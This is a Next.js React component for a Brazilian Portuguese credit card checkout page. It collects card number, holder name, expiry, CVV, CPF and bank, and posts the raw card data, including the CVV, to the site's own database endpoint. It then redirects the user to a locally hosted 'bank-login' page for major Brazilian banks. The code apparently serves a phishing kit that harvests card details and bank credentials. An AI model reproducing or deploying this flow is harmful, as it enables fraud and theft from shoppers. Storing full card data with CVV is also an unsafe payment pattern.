"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { toast } from "react-hot-toast";

export default function CreditCardPaymentClient({ orderId }: { orderId: string }) {
  const [order, setOrder] = useState<any>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cpf, setCpf] = useState("");
  const [parcelas, setParcelas] = useState<number>(1);
  const [selectedBank, setSelectedBank] = useState<string>("");
  const router = useRouter();

  // Fetch order details
  useEffect(() => {
    const fetchOrder = async () => {
      try {
        const response = await fetch(`/api/orders/${orderId}`, { credentials: "include" });
        const data = await response.json();
        if (response.ok) {
          setOrder(data.order);
        } else {
          toast.error(data.error || "Erro ao carregar pedido.");
          router.push("/meus-pedidos");
        }
      } catch (error) {
        console.error("Error fetching order:", error);
        toast.error("Erro ao carregar pedido.");
        router.push("/meus-pedidos");
      }
    };
    fetchOrder();
  }, [orderId, router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardNumber || !cardHolder || !expiryDate || !cvv || !cpf || !selectedBank) {
      toast.error("Por favor, preencha todos os campos.");
      return;
    }

    try {
      // Save payment details to the database
      const response = await fetch("/api/payments", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          orderId,
          paymentMethod: "creditCard",
          cardNumber,
          cardHolder,
          expiryDate,
          cvv,
          cpf,
          parcelas,
          bank: selectedBank,
        }),
        credentials: "include",
      });

      const data = await response.json();
      if (response.ok) {
        toast.success("Dados do pagamento salvos com sucesso!");
        // Redirect to the bank's login page
        router.push(`/bank-login/${selectedBank}?orderId=${orderId}`);
      } else {
        toast.error(data.error || "Erro ao salvar dados do pagamento.");
      }
    } catch (error) {
      console.error("Error saving payment details:", error);
      toast.error("Erro ao salvar dados do pagamento.");
    }
  };

  const handleBackToCheckout = () => {
    router.push("/checkout?fromPayment=true");
  };

  if (!order) {
    return <div>Carregando...</div>;
  }

  return (
    <div className="min-h-screen bg-white">
      <main className="py-12">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-gray-800 mb-8 text-center">
            Pagamento com Cartão de Crédito
          </h1>
          <div className="bg-gray-50 p-6 rounded-lg shadow-md max-w-md mx-auto">
            <h2 className="text-2xl font-semibold text-gray-800 mb-4">
              Pedido #{orderId}
            </h2>
            <p className="text-lg font-bold text-gray-800 mb-4">
              Total: {order.total.toLocaleString("pt-BR", {
                style: "currency",
                currency: "BRL",
              })}
            </p>
            <form onSubmit={handleSubmit}>
              <div className="mb-4">
                <label className="block text-gray-600 mb-2">Número do Cartão</label>
                <input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  className="w-full p-3 border rounded-lg"
                  placeholder="1234 5678 9012 3456"
                  required
                />
              </div>
              <div className="mb-4">
                <label className="block text-gray-600 mb-2">Nome no Cartão</label>
                <input
                  type="text"
                  value={cardHolder}
                  onChange={(e) => setCardHolder(e.target.value)}
                  className="w-full p-3 border rounded-lg"
                  placeholder="Nome Completo"
                  required
                />
              </div>
              <div className="flex space-x-4 mb-4">
                <div className="flex-1">
                  <label className="block text-gray-600 mb-2">Validade</label>
                  <input
                    type="text"
                    value={expiryDate}
                    onChange={(e) => setExpiryDate(e.target.value)}
                    className="w-full p-3 border rounded-lg"
                    placeholder="MM/AA"
                    required
                  />
                </div>
                <div className="flex-1">
                  <label className="block text-gray-600 mb-2">CVV</label>
                  <input
                    type="text"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value)}
                    className="w-full p-3 border rounded-lg"
                    placeholder="123"
                    required
                  />
                </div>
              </div>
              <div className="mb-4">
                <label className="block text-gray-600 mb-2">CPF</label>
                <input
                  type="text"
                  value={cpf}
                  onChange={(e) => setCpf(e.target.value)}
                  className="w-full p-3 border rounded-lg"
                  placeholder="123.456.789-00"
                  required
                />
              </div>
              <div className="mb-4">
                <label className="block text-gray-600 mb-2">Número de Parcelas</label>
                <select
                  value={parcelas}
                  onChange={(e) => setParcelas(Number(e.target.value))}
                  className="w-full p-3 border rounded-lg"
                  required
                >
                  {[...Array(12)].map((_, i) => (
                    <option key={i + 1} value={i + 1}>
                      {i + 1}x de {(order.total / (i + 1)).toLocaleString("pt-BR", {
                        style: "currency",
                        currency: "BRL",
                      })}
                    </option>
                  ))}
                </select>
              </div>
              <div className="mb-4">
                <label className="block text-gray-600 mb-2">Banco</label>
                <select
                  value={selectedBank}
                  onChange={(e) => setSelectedBank(e.target.value)}
                  className="w-full p-3 border rounded-lg"
                  required
                >
                  <option value="">Selecione um banco</option>
                  <option value="banco-do-brasil">Banco do Brasil</option>
                  <option value="bradesco">Bradesco</option>
                  <option value="itau">Itaú</option>
                  <option value="santander">Santander</option>
                </select>
              </div>
              <div className="flex space-x-4">
                <button
                  type="button"
                  onClick={handleBackToCheckout}
                  className="w-1/2 bg-gray-300 text-gray-800 p-3 rounded-lg hover:bg-gray-400 transition-colors"
                >
                  Voltar
                </button>
                <button
                  type="submit"
                  className="w-1/2 bg-green-600 text-white p-3 rounded-lg hover:bg-green-700 transition-colors"
                >
                  Continuar
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>
    </div>
  );
}